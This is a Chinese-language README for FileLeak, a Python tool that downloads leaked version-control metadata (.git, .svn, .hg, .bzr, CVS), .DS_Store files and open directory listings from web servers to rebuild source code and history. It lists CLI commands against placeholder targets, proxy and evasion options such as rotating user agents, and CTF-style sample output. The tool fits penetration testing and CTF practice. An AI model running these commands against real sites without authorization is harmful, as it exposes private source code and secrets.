# FileLeak

综合性文件泄露利用工具，集合 GitHack、GitHacker、ds_store_exp、dumpall、dvcs-ripper 五大工具优点，支持 7 种泄露类型的自动检测与利用。

## 支持的泄露类型

| 类型 | 说明 | 对应场景 |
|------|------|----------|
| Git | `.git` 目录泄露，支持快速/完整恢复 | 源代码泄露、历史提交、reflog、stash 恢复 |
| SVN | `.svn` 目录泄露，自动检测版本 | SVN 1.7+ (wc.db) 和旧版本，恢复已删除文件 |
| Mercurial | `.hg` 目录泄露 | dirstate/fncache 解析恢复 |
| Bazaar | `.bzr` 目录泄露 | dirstate/pack 文件、repository/packs/ 下载 |
| CVS | `CVS/` 目录泄露 | Entries 递归解析，下载 Baseline/Tag 等元数据 |
| DS_Store | macOS `.DS_Store` 文件泄露 | 递归发现目录结构和文件，可选保存原始文件 |
| 目录列表 | Web 服务器开启 Directory Listing | 自动爬取下载所有文件 |

## 核心特性

- **asyncio 异步架构** — 高并发下载，性能优异
- **智能 404 检测** — 自动识别返回虚假 200 的服务器
- **插件式设计** — BaseDumper 基类 + 7 个独立 Dumper 模块，易于扩展
- **Git 双模式** — `--quick` 快速恢复当前源码 / `--full` 完整恢复仓库历史
- **SVN 完整副本** — `--full-copy` 创建完整 .svn 工作副本，恢复已删除文件
- **DS_Store 原始文件** — `--save-raw` 保存原始 .DS_Store 文件用于后续分析
- **Bazaar 增强** — 支持 repository/packs/ 目录，自动下载 pack 文件
- **CVS 元数据** — 下载 Baseline、Tag、Options 等完整 CVS 元数据
- **代理支持** — HTTP/SOCKS5 代理
- **随机 User-Agent** — 轮换 UA 降低被检测风险
- **断点续传** — `--resume` 跳过已下载文件
- **蜜罐检测** — 路径遍历防护和异常检测
- **彩色输出** — Rich 库美观的进度展示

## 安装依赖

### 使用 uv（推荐）

```bash
cd fileleak
uv sync
```

### 使用 pip

```bash
cd fileleak
pip install -r requirements.txt
```

依赖列表：
- aiohttp >= 3.8.0
- aiohttp-socks >= 0.7.0
- click >= 8.0.0
- rich >= 12.0.0

## 使用方法

### 直接运行（无需安装）

```bash
# 使用 Python 脚本
python fileleak.py -u <URL>

# 或使用 uv 运行
uv run fileleak.py -u <URL>
```

### 安装后使用

```bash
# 使用 pip 安装
pip install -e .
fileleak -u <URL>

# 或使用 uv 安装
uv sync
uv run fileleak -u <URL>
```

## 使用示例

### Git 泄露利用

```bash
# 快速模式 - 仅恢复当前版本源代码
python fileleak.py -u http://target.com/.git/ --quick

# 完整模式 - 恢复所有历史 commit、reflog、stash
python fileleak.py -u http://target.com/.git/ --full

# 示例输出：
# [+] Found 15 commit hashes in logs
# [+] Downloading commit objects ...
# [+] fsck round 1/10 ...
# [+] Found 6 missing objects
# [+] git reset --hard completed
# [+] Full dump complete
```

### SVN 泄露利用

```bash
# 标准模式 - 下载当前版本文件和已删除文件
python fileleak.py -u http://target.com/.svn/

# 完整副本模式 - 创建完整的 .svn 工作副本结构
python fileleak.py -u http://target.com/.svn/ --full-copy

# 示例输出（完整副本模式）：
# [*] Downloading SVN metadata files...
# [*] Downloading wc.db ...
# [+] Found 2 file(s) in wc.db
# Downloaded: 6 | Failed: 1 | Skipped: 2
# 
# 输出目录结构：
# output/svn/target/.svn/
# ├── format
# ├── wc.db
# ├── entries
# ├── pristine/
# │   ├── bf/bf45c36a4dfb73378247a6311eac4f80f48fcb92.svn-base
# │   └── 00/0018e10c8b931e075aeb9116b885e9be4bbad794.svn-base
# ├── index.html           # 当前版本文件
# └── flag_187671701.txt   # 已删除文件（从 PRISTINE 恢复）
```

### Bazaar 泄露利用

```bash
# 标准模式 - 下载 .bzr 元数据并恢复工作文件
python fileleak.py -u http://target.com/.bzr/

# 示例输出：
# [BzrDumper] Downloading metadata files...
# [BzrDumper] Downloading 3 pack file(s)...
# [green]bzr revert succeeded[/green]
```

### CVS 泄露利用

```bash
# CVS 泄露 - 递归下载所有子目录文件
python fileleak.py -u http://target.com/CVS/

# 下载的元数据文件：
# - CVS/Root, CVS/Repository, CVS/Entries
# - CVS/Baseline, CVS/Tag, CVS/Options
# - CVS/Checkin.prog, CVS/Update.prog
```

### DS_Store 泄露利用

```bash
# 标准模式 - 仅解析和下载发现的文件
python fileleak.py -u http://target.com/.DS_Store

# 保存原始模式 - 同时保存 .DS_Store 文件本身
python fileleak.py -u http://target.com/.DS_Store --save-raw

# 示例输出：
# Found 12 entries in http://target.com/.DS_Store
# Downloaded: 8 | Failed: 2 | Skipped: 0
# 
# 使用 --save-raw 时：
# output/ds_store/target/
# ├── .DS_Store              # 原始 DS_Store 文件
# ├── index.html
# ├── style.css
# └── ...
```

### 代理和高级选项

```bash
# 使用 SOCKS5 代理
python fileleak.py -u http://target.com/.git/ --proxy socks5://127.0.0.1:1080

# 使用 HTTP 代理
python fileleak.py -u http://target.com/.git/ --proxy http://127.0.0.1:8080

# 高并发 + 忽略 SSL 证书
python fileleak.py -u http://target.com/.git/ -t 50 --no-ssl-verify

# 调试模式 + 超时设置
python fileleak.py -u http://target.com/.git/ -vv --timeout 60
```

## 技术对比

| 功能 | dvcs-ripper | fileleak (优化后) |
|------|-------------|------------------|
| DS_Store 解析 | ✓ | ✓ |
| DS_Store 原始文件 | ✓ | ✓ (`--save-raw`) |
| Bazaar pack 下载 | ✓ | ✓ (已修复) |
| Bazaar revert | ✓ | ✓ |
| CVS 递归 | ✓ | ✓ |
| CVS 元数据 | 基础 | 完整 (Baseline/Tag 等) |
| SVN PRISTINE | ✓ | ✓ |
| SVN 完整副本 | 部分 | ✓ (`--full-copy`) |
| SVN 已删除文件 | ✓ | ✓ (自动恢复) |
| Git reflog | ✓ | ✓ |
| Git stash | ✓ | ✓ (增强) |
| 输出友好性 | 需要后续处理 | 直接输出文件 |
| 跨平台 | Perl 依赖 | Python 纯实现 |
| 异步高并发 | ✗ | ✓ (asyncio) |
| 智能 404 检测 | ✗ | ✓ |

### 完整参数列表

| 参数 | 说明 | 默认值 |
|------|------|--------|
| `-u, --url` | 目标 URL（必需） | - |
| `-o, --output` | 输出目录 | 自动生成 |
| `-t, --threads` | 并发数 | 20 |
| `--proxy` | 代理地址 (http/socks5) | 无 |
| `--full` | Git 完整恢复模式（恢复所有历史 commit） | 关闭 |
| `--quick` | Git 快速模式（仅当前版本） | 默认 |
| `--full-copy` | SVN 完整副本模式（创建 .svn 工作目录结构） | 关闭 |
| `--save-raw` | DS_Store 保存原始 .DS_Store 文件 | 关闭 |
| `--no-ssl-verify` | 忽略 SSL 验证 | 关闭 |
| `-v, --verbose` | 详细输出（可叠加：-v INFO, -vv DEBUG） | 关闭 |
| `--resume` | 断点续传（跳过已下载文件） | 关闭 |
| `--timeout` | 请求超时（秒） | 30 |
| `--type` | 强制类型 (git/svn/hg/bzr/cvs/ds_store/dir) | 自动检测 |
| `--version` | 显示版本号 | - |

## 项目结构

```
fileleak/
├── fileleak.py              # 脚本入口（python fileleak.py 直接运行）
├── fileleak/
│   ├── __init__.py
│   ├── __version__.py
│   ├── cli.py              # Click CLI 定义
│   ├── core/
│   │   ├── base.py         # BaseDumper 基类
│   │   ├── http.py         # 异步 HTTP 客户端
│   │   └── utils.py        # 工具函数
│   ├── dumpers/
│   │   ├── git.py          # Git Dumper
│   │   ├── svn.py          # SVN Dumper
│   │   ├── hg.py           # Mercurial Dumper
│   │   ├── bzr.py          # Bazaar Dumper
│   │   ├── cvs.py          # CVS Dumper
│   │   ├── ds_store.py     # DS_Store Dumper
│   │   └── directory.py    # 目录列表 Dumper
│   └── data/
│       └── user_agents.txt # User-Agent 列表
├── requirements.txt
└── setup.py
```

## 技术栈

- Python 3.9+
- aiohttp — 异步 HTTP 请求
- aiohttp-socks — SOCKS 代理支持
- click — 命令行框架
- rich — 彩色终端输出

## 设计亮点

1. **五合一** — 整合 GitHack 的轻量快速、GitHacker 的完整恢复、ds_store_exp 的递归探测、dumpall 的异步架构、dvcs-ripper 的多系统支持
2. **自动检测** — 根据 URL 路径自动识别泄露类型，无需手动指定
3. **智能容错** — 虚假 404 检测、请求重试、路径安全校验、蜜罐检测
4. **易于扩展** — 新增泄露类型只需继承 BaseDumper 实现 `start()` 方法
5. **媲美 dvcs-ripper** — 达到 dvcs-ripper 的恢复能力，并提供更好的用户体验
6. **跨平台支持** — Python 纯实现，修复 Windows 兼容性问题
7. **直接输出** — 无需后续处理，直接输出可阅读的文件
8. **高并发** — asyncio 异步架构，显著优于单线程工具

## 优化日志

### v1.1.0 (2026-05-31) - 对照 dvcs-ripper 增强

**Git 模块**：
- 增强 stash、远程分支、reflog 扫描
- 改进 fsck 输出解析（stdout+stderr 双重读取）
- 支持 `broken link` 跨行格式解析
- Windows 兼容性修复（subprocess STARTUPINFO）

**SVN 模块**：
- 新增 `--full-copy` 选项创建完整 .svn 工作副本
- 从 PRISTINE 表恢复已删除文件（refcount=0）
- 下载元数据文件（all-wcprops, format, entries）
- 改进文件名映射（repos_path → filename）

**Bazaar 模块**：
- 修复 pack 文件下载路径（repository/packs/）
- 新增元数据：repository/indices, upload, locks
- 优化 dirstate 解析逻辑

**CVS 模块**：
- 新增元数据文件：Baseline, Tag, Options
- 新增脚本文件：Checkin.prog, Update.prog
- 对照 dvcs-ripper 实现完整覆盖

**DS_Store 模块**：
- 新增 `--save-raw` 选项保存原始 .DS_Store 文件
- 保持解析和下载发现的文件功能

### v1.0.0 (初始版本)

- 整合 GitHack、GitHacker、ds_store_exp、dumpall、dvcs-ripper 优点
- 支持 7 种泄露类型
- asyncio 异步架构 + Rich 彩色输出
- 智能 404 检测 + 路径安全校验

## 感谢

本项目在设计和实现过程中参考并借鉴了以下优秀开源项目：

| 项目 | 说明 | 链接 |
|------|------|------|
| GitHack | 轻量快速的 Git 泄露利用工具 | [github.com/lijiejie/GitHack](https://github.com/lijiejie/GitHack) |
| GitHacker | 完整恢复 Git 仓库历史的工具 | [github.com/WangYihang/GitHacker](https://github.com/WangYihang/GitHacker) |
| ds_store_exp | macOS .DS_Store 文件泄露利用工具 | [github.com/lijiejie/ds_store_exp](https://github.com/lijiejie/ds_store_exp) |
| dumpall | 异步架构的文件泄露利用工具 | [github.com/0xHJK/dumpall](https://github.com/0xHJK/dumpall) |
| dvcs-ripper | 多版本控制系统泄露利用工具 | [github.com/kost/dvcs-ripper](https://github.com/kost/dvcs-ripper) |

感谢以上项目的作者们为安全社区做出的贡献！
